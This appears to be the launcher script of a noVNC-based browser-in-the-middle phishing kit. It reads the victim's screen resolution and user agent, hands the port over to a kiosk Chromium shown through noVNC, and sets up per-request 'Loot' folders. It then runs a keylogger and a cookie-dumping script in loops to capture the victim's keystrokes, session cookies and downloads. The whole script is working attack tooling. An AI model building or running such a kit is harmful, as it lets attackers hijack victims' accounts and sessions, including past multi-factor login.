#!/bin/bash
# server.sh

export DISPLAY=:0
export URL="$WEBPAGE"

# start PHP for static page reading resolution
#sudo -E /bin/bash -c "php -q -S 0.0.0.0:8111 &" > /dev/null 2>&1
#sudo -E /bin/bash -c "php -q -S 0.0.0.0:8111 &"
php -q -S 0.0.0.0:8111 &

# set target URL in php.ini for getting the title
#echo "URL=$WEBPAGE" > php.ini ; URL=$(head -1 php.ini | cut -d "=" -f 2)
echo "URL=$WEBPAGE" > php.ini

# wait for victim resolution to be written to disk
while [ ! -f /home/user/tmp/resolution$SID.txt ]; do
	sleep .2
done

# stop PHP and redirect traffic to noVNC port
sudo pkill -9 php
sudo socat TCP-LISTEN:8111,reuseaddr,fork TCP:localhost:5980 &

export RESOLUTION=$(head -1 /home/user/tmp/resolution$SID.txt)
export REQID=$(head -1 /home/user/tmp/reqid$SID.txt)
export USERA=$(head -1 /home/user/tmp/useragent$SID.txt)

### FORMER startVNC.sh ###
#sudo -E /bin/bash -c /home/user/startVNC.sh $RESOLUTION

# remove X display lock
sudo rm -f /tmp/.X${DISPLAY#:}-lock

# write resolution to chromium.conf and add custom profile dir
#IFS=x read -ra arr <<< "$RESOLUTION" && sudo sed -i "s/1280,720/${arr[0]},${arr[1]}/" /etc/chromium/chromium.conf
#IFS=x read -ra arr <<< "$RESOLUTION" && sudo sed -i "s/--window-size=[0-9]*,[0-9]*/--window-size=${arr[0]},${arr[1]}/" /etc/chromium/chromium.conf
IFS=x read -ra arr <<< "$RESOLUTION" && sudo sed -i "s#--window-size=[0-9]*,[0-9]*#--window-size=${arr[0]},${arr[1]} --user-data-dir=/home/user/Chrome#" /etc/chromium/chromium.conf

# start kiosk.sh in background
#/bin/bash -c "/home/user/kiosk.sh" &
/bin/bash /home/user/kiosk.sh "$USERA" &

# prepare loot und keylogger
date=$(date +"%Y%m%d-%H%M%S")
ldir="$date-$REQID"
mkdir -p /etc/Loot/$ldir/{Downloads,Chrome}
#mkdir -p /home/user/Downloads
rm -rf /home/user/{Downloads,Chrome}
ln -s /etc/Loot/$ldir/Downloads /home/user/Downloads
ln -s /etc/Loot/$ldir/Chrome /home/user/Chrome
#nohup /bin/bash -c "touch /home/user/Downloads/Cookies.txt ; mkdir /home/user/Downloads/Default" &
touch /home/user/Downloads/cookies.txt
#nohup /bin/bash -c "touch /home/user/Downloads/Keylogger.txt ; sudo pip3 install pyxhook pycryptodome" &
touch /home/user/Downloads/keylog.txt
chmod a+w /home/user/Downloads/{cookies.txt,keylog.txt}
nohup sudo pip3 install pyxhook pycryptodome --break-system-packages &

# regularly store collected data
#nohup /bin/bash -c "sleep 30 && sudo python3 /home/user/keylogger.py 2> log.txt" &
#nohup /bin/bash -c "sleep 7 && sudo python3 keylogger.py 2>> errorlog.txt" &
nohup /bin/bash -c "while [ ! $(ps aux | grep keylog | grep -v grep | grep -v while >/dev/null) ]; do sleep 4 && sudo python3 keylogger.py 2>> errorlog.txt; done" &
nohup /bin/bash -c "while true; do sleep 5; sudo python3 cookies.py > Downloads/cookies.txt 2>> errorlog.txt; done" &
# running as user "user" not root!
#nohup /bin/bash -c "while true ; do sleep 30 ; sudo cp -R -u /root/.config/chromium/Default /home/user/Downloads/ ; done" &
#nohup /bin/bash -c "while true ; do sleep 32 ; sudo cp -R -u /root/Downloads/ /home/user/Downloads/ ; done" &

# start X with given resolution
#nohup /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset > /dev/null || true &
nohup /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset > /dev/null &

# wait until X display is created
while [[ ! $(xdpyinfo -display $DISPLAY 2> /dev/null) ]]; do sleep .3; done

# start X server with chromium (quicker start in kiosk.sh)
#nohup startx chromium &
#nohup startx &

# start x11vnc and novnc_proxy
nohup x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared -display $DISPLAY -rfbauth /home/user/.vnc/passwd -rfbport 5900 "$@" &
nohup /home/user/noVNC/utils/novnc_proxy --vnc localhost:5900 --listen 5980



